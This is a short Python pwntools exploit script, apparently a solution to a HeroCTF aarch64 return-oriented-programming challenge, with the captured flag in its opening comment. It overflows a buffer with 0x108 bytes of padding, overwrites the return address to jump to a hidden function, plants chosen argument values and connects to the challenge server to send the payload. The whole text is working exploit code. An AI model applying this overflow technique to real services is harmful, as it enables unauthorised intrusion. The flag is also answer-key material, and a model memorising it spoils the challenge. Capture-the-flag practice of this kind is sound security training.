# Hero{ret2csu_1s_th3_w4y_f0r_th1s_f4ncy_aarch64_ROP!!!}
from pwn import *

secret = 0x400678
test   = 0x4006d0

padding = b"A" * 0x108

args = cyclic(128)
args = args.replace(b'kaaalaaa', p64(0xdeadbeef))
args = args.replace(b'iaaajaaa', p64(0xcafebabe900df00d))
args = args.replace(b'gaaahaaa', p64(0xfeedbabebaadf00d))

payload  = padding
payload += p64(secret)
payload += args

p = remote('aargh.heroctf.fr', 1337)
p.sendline(payload)
p.interactive()
